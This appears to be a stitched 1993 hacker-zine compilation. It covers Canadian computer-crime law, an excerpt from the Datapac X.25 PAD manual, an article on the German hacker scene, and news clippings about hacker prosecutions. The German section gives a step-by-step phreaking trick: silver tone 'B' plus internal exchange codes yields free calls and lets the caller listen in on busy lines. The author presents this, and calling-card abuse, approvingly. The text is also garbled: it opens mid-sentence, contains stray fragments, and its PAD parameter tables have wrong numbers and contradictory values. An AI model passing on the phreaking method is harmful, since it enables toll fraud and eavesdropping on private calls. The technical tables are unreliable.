            paragraph (a) or (b) or an offense under section 430 in

As you can see our criminal code carries severe penalties for
both Hacking and Virus spreading however, there is little
precedent to set sentences by. While this is reassuring, there
seems to be a new trends to prosecute those who are caught at
computer crime. Moreover it seems to be a trend to prosecute with
setting precedence in mind.. So for those of you in .ca who have
busted recently I would begin to fear right about now.

For the most part most computer crime in Canada that results in
busts is telco related, most often the charges are federal but
the sentences are light, however as I said before, this is
changing. And will continue to change with each new bust ,
welcome to the new dawn I suppose.

                     Datapac, Canada's first net

As it stands Datapac is Canada's largest and most used
network, it is old archaic and slow, yet still it is immense
amounts of fun to play with. The following is a technical excerpt
to help you understand the operation of Datapac and how to
maneuver it. Those of you who are already familiar with the
workings of this type of network will find this dry and
repetitive for those of you who are not familiar it may  make for
some learning.

After the manual entry you will find a list of interesting sites
to explore with, enjoy....

              Datapac 3101 "Welcome to the Dark Ages"

Interface (ITI) in a Packet Assembler/Disassembler (PAD), which
allows the devices to access the Network over dial-up (DDD) or Dedicated
Access Lines.

ITI, the end-to-end protocol for Datapac 3101, conforms to the
CCITT recommendations X.3, X.28 and X.29 and supports access to the
Datapac Network for asynchronous, start-stop character mode terminals.

     X.3 specifies the operation of the PAD.  It contains the
specifications for the twenty-two International parameters and
their operation.

     X.25 specifies the command language between the terminal and
the PAD.  It also specifies the conditions which define the command
mode and the data transfer mode.

     X.29 specifies the procedures to be followed by an X.25 DTE
to access and modify the parameters in the PAD as well as the data
transfer procedure.

The Datapac 3101 service provides for terminal to Host (user's
computer) and terminal to terminal communication.  The Host access
should conform with the X.25 protocol, using the Datapac 3000 access
service, and also support the higher level protocol conventions for ITI.
Host access may also be provided via the Datapac 3101 service for some
applications.  The Datapac 3101 service also provides block mode and
tape support.

INTERNATIONAL PAD PARAMETERS
----------------------------

1)   Ability to Escape from Data Transfer State*

     The setting of this parameter allows the user to interrupt
the communication of his or her application (data transfer mode) and
interact with the PAD (common mode).  The character to do this is
"ControlJP".  To return to data transfer mode, press the carriage
return or enter a blank command line.  If the user wants to send a
"ControlJP" to the Host, with this parameter set set to one, simply
hit ControlJP twice and the second ControlJP will go to the Host and
the user will remain in data transfer mode.  This also applies to
the user data field in the call request command line.

Parameter Number:  1
Possible Values:   0 = Escape not possible.
                   1 = Escape is possible.

*Note:  Escape from Data transfer mode may also be possible using
the break signal if parameter seven is set to eight.


2)   Echo*

     This parameter indicates to the PAD whether or not the
terminal input data must be echoed.  This may be required if the user's
terminal cannot echo back what is being entered.

Parameter Number:  1
Possible Values:   0 = No echo.
                   1 = Echo.

*Note:  Echo will also be affected by the setting of Parameter 20.


3)   Selection of Data Forwarding Signal

     This parameter indicates to the PAD the set to terminal
generated characters or conditions that will cause data to be forwarded
to the destination.  For example, (CR) can be used as a data forwarding
signal on receipt of a (CR) from the local DTE Y, the PAD will forward all
characters in its buffer to the remote end, including the (CR).  If P13 is
set to 6.7, 22 or 23, a (LF) will be included in the packet and will delimit
it.  Data is also forwarded when the buffer is full whether or not a
forwarding character is received.

Parameter Number:  3
Possible Values:   0 = No data forwarding signal.
                   2 = Forward on carriage return.
                   2 = Carriage return.
                 126 = All characters in columns 0 and 1
                       of ASCII table and the character
                       del of International alphabet #5.


4)   Selection of Idle Timer Delay

      This parameter is used to determine the idle timer limit
value when data forwarding is based on timeouts.  To optimize packetizing
of data, no data forwarding signal need be specified.  The PAD will then
packetize data based on packet size specified (256 or 128 characters).
The idle timer is used to send any packets that are not fully filled.
If idle timer is activated and the Host requires the (CR) to input data,
it still must be provided before the data send is accepted by the Host.
The idle timer does not send any empty packets.


Parameter Number:  4
Possible Values:   0 = No data forwarding on timeout is
                       required.
               1-255 = Indicates value of the delay in
                       twenties of a second.  (i.e., a
                       value of 250 makes the time wait
                       10 seconds)

*Note:  When editing is on (P15:1), the idle timer is inactive.
If this is the only data forwarding condition, turning the editing function
on could cause a user terminal to hand or data not to be forwarded.

5)   Auxiliary Device Control*

     This is used for flow control of data coming from either a
PC or auxiliary device, e.g.:  a paper tape machine.  When set to
1 it indicates to the PAD that the data is to be read an auxiliary
I/O device connected to the terminal.  This parameter set to 2 indicates
that the data is coming from an intelligent device, i.e., a PC, and that
the PAD must exert flow control differently.

Parameter Number:  5
Possible Values:   0 = No use of X-on/X-off.
                   1 = Use of X-on/X-off for auxiliary
                       devices.
                   2 = Use of X-on/X-off for
                       intelligent terminals.

*Note:  A value of 2 is recommended for PC's.


6)   Suppress Network Messages

     This parameter indicates to the PAD whether or not Network
generated messages are to be transmitted to the terminal.

Parameter Number:  6
Possible Values:   0 = Suppress message.
                   1 = Transmit message.
                   5 = PAD prompt (*) follows Datapac
                       service signals.

7)   Procedure on Break

     This parameter is used to indicate how the PAD should
process a break signal that is received from the terminal
while the terminal is in data transfer state.

Parameter Number:  7
Possible Values:   0 = Nothing. (remain in data transfer
                       mode)
                   1 = Interrupt. (remain in data
                       transfer mode)
                   2 = Reset. (remain in data transfer
                       mode)
                   4 = Send an "indication of break"
                       message to the packet mode DTE.
                       (remain in data transfer mode)
                   8 = Escape from data transfer mode
                       (i.e., enter command mode)
                  16 = Discard output to terminal
                       activate Parameter 8 (P8:1)
                       (remain in data transfer mode)
                  21 = A combination of 1, 4 and 16.


*Note:  The break signal is ignored if the virtual circuit is not
established while in command state.  The break signal will delete
the current line.

         The valid values for P7 are 0, 1, 2, 8 and 21.

8)   Discard Output

     This parameter is used in conjunction with Parameter 7.
Depending upon the break procedure selected, this parameter may be
set by the PAD when the terminal user requests that terminal data be
discarded.  This parameter must then be reset by the destination
computer to allow normal delivery.  The PAD will discard all packets
destined for the terminal from the time the PAD sets this parameter
(i.e., it receives a break signal when Parameter 7 is set to 21) to
the time the parameter is reset by the destination.  It can only be
reset by the destination.

Parameter Number:  8
Possible Values:   0 = Normal delivery of output to
                       terminal.
                   1 = Discard output to terminal.

9)   Padding after Carriage Return

     This parameter is used to specify the number of padding
characters to be inserted by the PAD following a CR transmitted
to the terminal.  Padding allows time for the carriage to return
on mechanical printing devices.


Parameter Number:  9
Possible Values:   0 = 2 padding characters will be
                       inserted at 110 bps and 4
                       padding characters will be
                       inserted at higher speeds, in
                       command mode only.  (no padding
                       is done in data transfer mode)
               1-255 = The number of padding characters
                       to be inserted in both data
                       transfer and command mode.

10)  Line Folding

     This parameter indicates the maximum number of printable
characters that can be displayed on the terminal before the PAD must
send a format effector (i.e.., <CR><LF>).  This permits more data to
be transmitted in one packet while still letting the user print out
more than one line, i.e., printing out forms.

11)  Transmission Speed (Read only)

     This parameter is set by the PAD as a result of transmission
speed detection if the terminal accesses an autobaud port.  When a
private port with fixed speed is used, this parameter is set based
on the pre-stored information selected at subscription time.

Parameter Number:  11
Possible Values:    0 = 110 bps
                    2 = 300 bps
                    3 = 1200 bps
                    4 = 2400 bps
This is all very dry stuff (what buffer isn't?) however if you need more
info on it simply mail me.

are Canadian government machines which are fairly abundant on the

                    The German Scene
                      (by SevenUp)
                    ----------------

CCC
---

Talking about the German Hacker Scene, the Chaos Computer Club (CCC) comes
to most people's mind. They are most famous for their 'NASA-Hack' and their
publications like Hackerbibel and Datenschleuder, a monthly magazine talking
about 'softer' stuff than 2600, such as MUD's, the Internet and BBS'es.

They organize the annual Chaos Communication Congress, held annually
from December, 27th till 29th in Hamburg. Usually around 1000 people show up
there, discussing many different topics, such as Phreaking, Internet,
Women and Computer, Cellular Phones, Phone Cards and others. Many well-known
people, like Pengo and Professor Brunnstein the meeting. There are usually
also shows of Horror Movies (but no porns like at HohoCon), but it's not
a real 'party' like SummerCon or the upcoming Hacktic Party.

Another annually meeting from CCC members and many other hackers is at the
huge computer fare 'CeBit' in Hannover in March. The Get Together is at the
Telekom booth on Tuesday at 4pm. Usually Telekom (the German phone company)
representatives are very kind, give away phone cards (value: $4), but
usually don't have any interesting new informations.

There haven't been any hacks affiliated with the CCC for the last couple of
years. The CCC tries to get away from their former criminal image, talking
mostly about risks of computers in society, and producing lots of press
releases.

The KGB Hack
------------

Most of you might know "The Cuckoo's Egg" by Cliff Stoll. His exciting
novel talks about German Hackers hacking for the KGB.
These guys were using the German x.25 network Datex-P to get to a US
University, and from there to several hosts on the Arpa/Milnet (Internet).
They were using mostly basic knowledge to get into several UNIX and VMS
Systems, reading personal Mail and looking for documents the 'Russians'
might have been interested in.

It all ends up with the suicide (murder?) of Karl Koch, one of the hackers.
Although these hackers weren't CCC members, there is a pretty good book
from the CCC about it, containing more facts than Cliff's book:
"Hacker fuer Moskau", published by Wunderlich.

This is probably the best known German hack of all times.

Networks
--------

I. x.25

The German x.25 System is called 'Datex-P' and has the DNIC (2624).
Dialups are in almost every area code, or can be reached locally from
everywhere. There are also Tymnet and Sprintnet Dialups available in
the major cities, with some limitations though. Tymnet won't connect you
to dpac (Datapac Canada). Sprintnet has just a true dialup in Frankfurt,
the other dialups are handled by their partner Info AG, which allow
calling most RNUAs, but most Sprintnet NUIs won't work.

There is a 'Subnet' in the Datex-P Network, the so called 'WiN'
(which means scientific network). Almost all universities have connections
to the WiN, which means they pay a flat rate each month, which allows
them to make as many calls and transfer as much data to other WiN hosts,
as they like. Usually x.25 rates are charged by the volume of packages/data.
You can identify WiN addresses easily, because they start with
(0262)45050... There are many gateways from WiN to Internet, and also a few
from Internet to WiN. WiN NUAs can be reached without problem from any x.25
network in the world, like Sprintnet or Tymnet; though most WiN PADs will
refuse to connect to non-WiN NUAs.

There are also a couple of German systems, international hackers used to like.
The most-famous is probably Lutzifer in Hamburg, Germany. It can still
be reached from x.25 Networks like Sprintnet or Tymnet.
Around two years ago, British, American and other hackers used to trade
all kinds of codez on "Lutz". But now, Pat Sisson ("frenchkiss") from Sprintnet
Security and Dale Drew ("Bartman") from Tymnet Security, try to track
down everyone abusing their NUIs or PADs.

Before Lutzifer went up 2.5 years ago, tchh and Altos Munich were most
attractive. They were running the same simple Korn-Chat on an Altos.
There are still a couple of other x.25 Systems, which attract hackers
from all over the world, like qsd, Pegasus (in France and Switzerland) and
Secret Tectonics / sectec, a rather new semi-private Board in Germany with
x.25 and Direct Phone Dialups, uucp/Internet Mail, File and Message Bases and
all Phrack Issues as well.

II. Internet

But now, most hackers quit the x.25 scene and tried to get onto Internet.
Unlike the fast Internet connections in the USA between .edu sites,
German Internet connections are mostly routed through slow (9.6kbps or 64k)
x.25 Links.

This is mostly the fault of the German phone company 'Telekom'. They have a
monopoly on phone lines in Germany and charge 2-10 times higher fees than
American phone co's. Even local calls are US$1.50/hour.

There aren't many German Internet Sites that attract foreign hackers,
compared to US Sites that German Hackers are interested in.

There are almost no public Internet BBSes with free access in Germany.
Also, German Universities have often a pretty tight security and get
mad easily.

III. Amiga Kiddos

BBS'es are still the major hang-out besides IRC. The Amiga Scene with
its K-rad Kiddos (most of them under 18 years) used to be dominant a
couple of years ago, trading Calling Cards and new Blue Box frequencies
to call the best boards in the US to leech the latest games.
But recently, the IBM scene caught up and many guys switched from Amiga
to IBM; so over 50% of pirate boards are IBM boards now.

But recently, BBS sysops have to face hard times. A couple of months
ago, lots of BBS'es in Berlin, but also in Bavaria and North Germany
got 'busted' - raided by the police because of their illegal warez.
(see my article in Phrack 42 about it) The man behind these actions
is the lawyer 'Guenther Freiherr von Gravenreuth', who works for Acti-
vision, the SPA and BSA. He is tracking down kids with piracy as recklessly
as BBS Sysops, who sell subscriptions for a 'Disabled Upload/Download Ratio'
for around $100 a month. There have been a couple of these trials lately,
without much notice by the press. Mr Gravenreuth is also responsible for
many people's fear to put up a new BBS - especially in Bavaria where he lives.

Also, calling the favorite Board in the US is getting harder and harder,
as covered in the next Chapter.

IV. The Phone System

Blueboxing used to be the favorite sport of many German traders for the
last couple of years. But some phreakers wanted to make more money,
selling the Bluebox Story to Magazines like Capital or Spiegel, or to
TV Shows. Even AT&T and the German Telecom, who seemed to be blind about
this phreaking, couldn't avoid facing the truth now - they had to do
something, not only to recover from the huge losses, but also to save
their reputation.

There are a lot of rumors and text files about the actions these phone
companies took; most of them are fakes by 'eleet' people, who don't want
the 'lamers' to keep the trunks and the eleet boards busy. But some actions
seem to be certified; e. g. Telekom bought some intelligent filter boxes
from British Telecom. These boxes should detect any C5 tones (especially
2600 Hz), being sent by phreakers; and log the number of the phreaker,
if possible.

If possible, because the Telekom doesn't have ANI in most cases. Until
recently, all phone lines used to be analog, pulse dialing lines
with huge relay switches. Then the Telekom started switching to 'modern'
digitally switched lines, which allow Touch-Tone-Dialing, and also a few
other nice features, which I want to cover now.

One of these nice features 'died' just about 3 weeks ago, because someone
informed the new magazine 'Focus'.

The trick was very simple. All you need was a digital line which allowed
you to dial touch tone, and a 'Silver Box' - a device, that allows you to
dial the digits 0...9, #, * and also A, B, C and D - many modems have
this capability too.

All you had to do was to dial 'B' + 'xxx' + 'yyyy', where 'B' is the
Silver Tone B, 'xxx' is an internal Telekom code, and 'yyyy' are the last
four digits of a phone number. The internal codes 'xxx' usually look like
010, 223, 011, and so on - they switch you to an exchange, mostly in your
own area code, but often in a different one! Notice that exchange number and
internal code are different. When you are connected to a certain exchange,
dialing the four 'yyyy' digits connects you to a certain phone number in
that exchange. This enables you to make free calls - also to different area
codes, but you have to try around to find which code matches with which
exchange. But that's not all; now the fun just begins! Imagine the number
you dial is busy... you won't hear a busy signal then, you would just be
connected into the call! You could listen to the conversation of two parties!
Imagine how much fun this could be... and imagine someone would be listening
to your private conversations!

When Telekom read the article, most area codes lost this capability;
but there are still some reported to work.

Blueboxing is getting harder and harder, MCI and AT&T keep on changing their
'Break' frequencies more rapidly (though they still use in-band CCITT C5
signalling); so more and more people offer Calling Card subscriptions, and
even more traders, who refuse paying Telekom's high fees, buy them. They
are offered mostly by Americans, Belgium people and Germans, for about $100
a month. Also, I haven't heard of any case where a German got busted for
abusing AT&T's Calling Cards; probably because Telekom can't really trace
phones lines, either technically nor legally (they may not just 'tap' phone
lines because of people's privacy).

Also, German Toll Free Numbers (they start with 0130) are getting more and
more. I would take a guess and say they grow 20%-80% a year. There isn't any
official directory nor a directory assistance for these numbers, and many
companies want these numbers to remain 'unknown' to the evil hackers, since
Telekom is asking high fees for them.

So many Germans compile and scan these numbers; there is also a semi-public
list on them by SLINK - available on many BBS'es and on local German Newsgroups.
This list also contains numbers of business companies like Microsoft,
Hewlett Packard or Dell in Austin (hi erik :) ), so it is quite useful for
'normal people' too.

There have also been reported the first PBX-like Systems in Germany; this is
quite a sensation, because German Telekom laws don't allow PBX'es, or even the
linking of two phone lines (like 3-way calling). So in fact, these Systems
weren't real PBX'es, but Merial Mail VMB Systems with the Outdial feature.

PaRtY 0n!

There are a couple of interesting get-togethers and parties.
I mentioned the annual Chaos Communication Congress after Christmas;
the CCC also has weekly meetings on Tuesday. There are the annual
CeBIT hacker parties, on the Tuesday at CeBIT in March. After the
CeBIT meeting and weekly, there are get-togethers  at the 'Bo22',
a cafe in Hannover. These meetings have tradition since the KGB
Hacks of Pengo and 'Hagbard Celine' Karl Koch, as I mentioned above.
You will still find friends of them there, if you drop by on a Tuesday.
Since a couple of months and with Emmanuel Goldstein's great support,
we are having 2600 meetings in Munich, Germany too! These are the first
2600 meetings outside of the US; the first meeting was quite successful
with over 30 people, and the next one in July will be successful too,
hopefully. Some international visitors from the US are expected, too.
These meetings are held at around 6pm in front of Burger King at
Central Station, Munich. I also like to thank Munich's Number One
Hit Radio Station 89 HIT FM at this point, for letting us into the
air for 3 minutes, talking about the 2600 meeting and a bit about 'hacking'.
There are also semi-annual IRC parties in Germany, but they are
'just' parties with usually 100-150 people. Hacking and phreaking
isn't a topic there; probably less than 10% of them know what H/P means.

New Yorker Admits Cracking                              July 3, 1993
~~~~~~~~~~~~~~~~~~~~~~~~~~
(From AP Newswire Sources)

 Twenty-one-year-old Mark Abene of New York, known as "Phiber Optik" in
 the underground computing community, has pleaded guilty to charges he
 participated in a group that broke into computers used by phone companies
 and credit reporting services.

 The Reuter News Service says Abene was the last of the five young men
 indicted in the huge 1991 computer break-in scheme to admit committing the
 crimes. The group called itself "MOD," an acronym used for "Masters of
 Disaster" and "Masters of Deception."

 Abene pleaded guilty to one count of conspiracy and one count of
 unlawful access to computers. He faces a possible maximum prison term of
 10 years and fine of $500,000.

(From AP Newswire Sources)

 A man accused of invading a computer and embezzling some
 $192,000 has been executed in China.

 Shi Biao, an accountant at the Agricultural Bank of China's Jilin
 branch, was accused of forging deposit slips from Aug. 1 to
 Nov. 18, 1991.

 The crime was the first case of bank embezzlement via
 computer in China.  Authorities became aware of the plot
 when Shi and his alleged accomplice, Yu Lixin, tried to wire
 part of the money to Shenzhen in southern China.

Teen Takes the A Train --- Literally                    May 13, 1993
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(From AP Newswire sources)

 A 16 year old 10th grader successfully conveyed passengers on a NYC 10 car
 subway train for 2.5 hours until he went around a curve too quickly and
 could not reset the emergency brakes. Keron Thomas dressed as a NY subway
 train engineer impersonated Regoberto Sabio, a REAL subway motorman, while he
 was on vacation and even obtained Sabio's "pass number".

 Thomas was a Subway enthusiast who hung around train stations and areas
 where subway motormen and other subway workers hang out. A NYC subway
 spokesman was quoted as saying "Buffs like to watch...pretty soon they
 figure out how" [to run the train]. "This guy really knew what he was doing".

 Thomas was charged with criminal trespassing, criminal impersonation, and
 reckless endangerment.

Banks React To Scheme That Used Phony ATM               May 13, 1993
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(From AP Newswire Sources)

 At least three people are believed to be involved in an ATM scam that is
 thought to have netted roughly $ 60,000. The fraud was perpetrated by
 obtaining a real ATM machine (theorized to have been stolen from a warehouse)
 and placing it in a Connecticut shopping mall.

 When people attempted to use the machine, they received a message that the
 machine wasn't working correctly and gave back the card.  Little did they
 know that their bank account number and PIN code was recorded.  The fake
 machine was in place for about 2 weeks. It was removed and the thieves
 began making withdrawals.

 The Secret Service thinks the scammers recorded anywhere from 2000 to 3000
 account numbers/pin codes but did not get a chance to counterfeit
 and withdraw money except from a few hundred accounts before it
 became too dangerous to continue

Hacker Gets Prison Term For Phone Computer Tampering    June 4, 1993
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
by Gail Appleson (The Reuter Business Report)

 NEW YORK -- A computer hacker known as "Corrupt" who was part of a group that
 broke into computer systems operated by major telephone companies was
 sentenced Friday to one year and one day in prison.

 The defendant, John Lee, 21, of New York had pleaded guilty December 3, 1992
 to a conspiracy charge involving computer tampering, fraud and illegal
 wiretapping.

 The indictment alleges the defendants broke into computer switching systems
 operated by Southwestern Bell, New York Telephone, Pacific Bell, U.S. West
 and Martin Marietta Electronics Information and Missile Group.

 Southwestern Bell allegedly lost $370,000 because of the crimes.

 The defendants also allegedly tampered with systems owned by the nation's
 largest credit reporting companies including TRW, Trans Union and Information
 America.  They allegedly obtained 176 TRW credit reports on various
 individuals.

 The indictment alleged the group broke into the computers "to enhance their
 image and prestige among other computer hackers and to harass and intimidate
 rival hackers and other people they did not like."

Professional Computer Hackers First To Land In Jail Under New Law  June 4, 1993
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
by Nicholas Hills (The Vancouver Sunds)(Page A11)

LONDON -- In Brussels, they were celebrated as the two young men who broke the
gaudy secrets of EC president Jacques Delors' expense accounts.

In Sweden, they were known as the Eight-Legged Groove Machine, bringing down
part of the country's telephone network, forcing a highly publicized apology
from a government minister who said the chaos was all due to a 'technical
fault'.

They also broke into various European defense ministry networks, academic
systems at Hull University and the financial records of the leading London
bankers, S.G. Warburg.

No, these weren't two happy-go-lucky burglars; but rather, professional
computer hackers, aged 24 and 22, who made legal as well as technological
history by being the first offenders of this new trade to be jailed for their
crimes under new British law.

Neil Woods and Karl Strickland have gone to prison for six months each for
penetrating  computer  systems in 15 different countries.  The ease with which
they conducted this exercise, and their attitude that they were simply engaging
in "intellectual joyriding," has confirmed the worst fears of legal and
technological experts that computer hacking in Europe, at least, has become a
virtually uncontrollable virus.

The case became a cause celebre because of what had happened months before in
another courtroom where a teenage computer addict who had hacked into the White
House system, the EC, and even the Tokyo Zoo -- using a $400 birthday present
from his mother -- had walked free because a jury accepted, basically, that a
computer had taken over his mind.

The case of 19-year-old Paul Bedworth, who began hacking at the age of 14, and
is now studying "artificial intelligence" at Edinburgh University, provides an
insight into why hackers have turned the new computer world into an equivalent
state of delirium tremens.

Bedworth and two young friends caused thousands of dollars worth of damage to
computer systems in Britain and abroad. They were charged with criminal
conspiracy under the Computer Misuse Act of 1990.

Bedworth never did deny computer hacking at his trial, and did not give
evidence in his defense.  He simply said through his lawyer that there could
not have been any criminal intent because of his "pathological obsession" with
computers.

A jury of eight men and three women unanimously acquitted him.

Until the passage of the Computer Misuse Act in 1990, hacking was legal in
Britain.  Bedworth may have been found not guilty, but his activities were so
widespread that the authorities' investigation involved eight different British
police forces, and others from as far afield as Finland and Singapore.  It
produced so much evidence - mostly on disk - that if it had been printed out on
ordinary laser printer paper, it is estimated that the material would have
reached a height of 42 meters.

The police were devastated by the verdict, but are now feeling somewhat better
after the conviction of Woods and Strickland.

The pair, using the nicknames of Pad and Gandalf, would spend up to six hours a
day at their  computers,  boasting about "smashing" databases.

 Connie Bedworth said she was powerless to control the "monster" as he
 glued himself to the screen nearly 24 hours as day.  "He didn't want
 to eat or sleep--he just couldn't bear to be away from it, " she said.

 A jury decided Paul Bedworth, now 19, was so "hooked" he could not stop
 himself hacking in to companies' systems -- allegedly costing them
 thousands of dollars.

Hot For The Fingertips: An Internet Meeting Of Minds    May 23, 1993
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
by Frank Bajak (Associated Press)

 NEW YORK -- Somewhere in the ether and silicon that unite two workstations 11
 floors above lower Broadway, denizens of the cyberpunk milieu are feverishly
 debating whether anyone in government can be trusted.

 This is the 12-by-20-foot bare-walled home of MindVox, today's recreation hall
 for the new lost generation's telecomputing crowd.  You can enter by phone
 line or directly off Internet.

 Patrick Kroupa and Bruce Fancher are the proprietors, self-described former
 Legion of Doom telephone hackers who cut the cord with computing for a time
 after mid-1980s teen-age shenanigans.

 Kroupa is a towering 25-year-old high school dropout in a black leather jacket,
 with long hair gathered under a gray bandanna, three earrings and a hearty
 laugh.

 Fancher is 22 and more businesslike, but equally in love with this dream he
 left Tufts University for.

 They've invested more than $80,000 into Mindvox, which went fully operational
 in November and has more than 2,000 users, who pay $15 to $20 a month plus
 telephone charges.

 MindVox aspires to be a younger, harder-edged alternative to the WELL, a
 fertile 8-year-old watering hole for the mind in Sausalito, California, with
 more than 7,000 users, including scores of computer age luminaries.

 One popular feature is a round-table discussion on computer theft and security
 hosted by a U.S. Treasury agent.  The latest hot topic is the ease of breaking
 into a new flavor of local access network.

Hacker Accused of Rigging Radio Contests                April 22, 1993
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
By Don Clark (San Francisco Chronicle)

 A notorious hacker was charged yesterday with using computers to
 rig promotional contest at three Los Angeles radio stations, in
 a scheme that allegedly netted two Porsches, $20,000 in cash and
 at least two trips to Hawaii.

 Kevin Lee Poulsen, now awaiting trial on earlier federal charges,
 is accused of conspiring with two other hackers to seize control of
 incoming phone lines at the radio stations.  By making sure that only
 their calls got through, the conspirators were assured of winning the
 contests, federal prosecutors said.

 A new 19-count federal indictment filed in Los Angeles charges
 that Poulsen also set up his own wire taps and hacked into computers
 owned by California Department of Motor Vehicles and Pacific Bell.
 Through the latter, he obtained information about the undercover
 businesses and wiretaps run by the FBI, the indictment states.

 Poulsen, 27, is accused of committing the crimes during 17
 months on the lam from earlier charges of telecommunications and
 computers fraud filed in San Jose.  He was arrested in April 1991
 and is now in the federal Correctional Institution in Dublin.  In
 December, prosecutors added an espionage charge against him for his
 alleged theft of a classified military document.

 The indictment announced yesterday adds additional charges of
 computer and mail fraud, money laundering, interception of wire
 communications and obstruction of justice.

 Ronald Mark Austin and Justin Tanner Peterson have pleaded guilty
 to conspiracy and violating computer crime laws and have agreed to
 help against Poulsen.  Both are Los Angeles residents.

 Poulsen and Austin have made headlines together before.  As
 teenagers in Los Angeles, the two computer prodigies allegedly broke
 into a Pentagon-organized computer network that links researchers and
 defense contractors around the country.

SPA Tracks Software Pirates on Internet                 March 22, 1993
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
By Shawn Willett (InfoWorld)(Page 12)

 The Software Publishers Association has begun investigating reports of
 widespread piracy on the Internet, a loose amalgam of thousands of computer
 networks.

 The Internet, which began as a Unix-oriented, university-based communi-
 cations network, now reaches into corporate and government sites in 110
 countries and is growing at a rapid pace.

 The software theft, according to Andrew Patrizio, an editor at the
 _Software Industry Bulletin_, has been found on certain channels, particularly
 the warez channel.

 "People are openly talking about pirating software; there seems to be no
 one there to monitor it", Patrizio said.

 A major problem with the Internet is that the "sites" from where the
 software is being illegally downloaded can physically be located in countries
 that do not have strong antipiracy laws, such as Italy or the former Soviet
 Union.  The Internet also has no central administrator or system operator.

 "Policing the entire Internet would be a job", said Peter Beruk,
 litigation manager for the SPA, in Washington.  "My feeling would be to target
 specific sections that are offering a lot of commercial software free for the
 download", he said.

Treasury Told Computer Virus Secrets                  June 19, 1993
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
By: Joel Garreau (Washington Post) (Page A01)

 For more than a year, computer virus programs that can wreak havoc with
 computer systems throughout the world were made available by a U.S. government
 agency to anyone with a home computer and a modem, officials acknowledged this
 week.

 At least 1,000 computer users called a Treasury Department telephone number,
 spokesmen said, and had access to the virus codes by tapping into the
 department's Automated Information System bulletin board before it was muzzled
 last month.

 The bulletin board, run by a security branch of the Bureau of Public Debt in
 Parkersburg, W.Va., is aimed at professionals whose job it is to combat such
 malicious destroyers of computer files as "The Internet Worm," "Satan's Little
 Helper" and "Dark Avenger's Mutation Engine." But nothing blocked anyone else
 from gaining access to the information.

 Before the practice was challenged by anonymous whistleblowers, the bulletin
 board offered "recompilable disassembled virus source code"-that is, programs
 manipulated to reveal their inner workings. The board also made available
 hundreds of "hackers' tools"-the cybernetic equivalent of safecracking aids.
 They included "password cracker" software-various programs that generate huge
 volumes of letters and numbers until they find the combination that a computer
 is programmed to recognize as authorizing access to its contents-and "war
 dialers," which call a vast array of telephone numbers and record those hooked
 to a computer.

 The information was intended to educate computer security personnel,
 according to Treasury spokesmen. "Until you understand how penetration is done,
 you can't secure your system," said Kim Clancy, the bulletin board's operator.

 The explosion of computer bulletin boards-dial-up systems that allow users
 to trade any product that can be expressed in machine-readable zeros and
 ones-has also added to the ease of virus transmission, computer analysts say.
 "I am Bulgarian and my country is known as the home of many productive virus
 writers, but at least our government has never officially distributed viruses,"
 wrote Vesselin Vladimirov Bontchev of the Virus Test Center of the University
 of Hamburg, Germany.

 At first, the AIS bulletin board contained only routine security alert
 postings. But then operator Clancy "began to get underground hacker files and
 post them on her board," said Bruce Sterling, author of "The Hacker Crackdown:
 Law and Disorder on the Electronic Frontier." "She amassed a truly impressive
 collection of underground stuff. If you don't read it, you don't know what's
 going to hit you."

 Clancy, 30, who is a former Air Force bomb-squad member, is highly regarded
 in the computer security world. Sterling, one of the nation's foremost writers
 about the computer underground, called her "probably the best there is in the
 federal government who's not military or NSA (National Security Agency).
 Probably better than most CIA."

 Clancy, meanwhile, is staying in touch with the underground. In fact, this
 week, she said, she was "testing a product for some hackers." Before it goes
 into production, she will review it to find potential bugs. It is a new war
 dialer called "Tone-Loc." "It's an extremely good tool. Saves me a lot of
 trouble. It enables me to run a hack against my own phone system faster" to
 determine points of vulnerability.
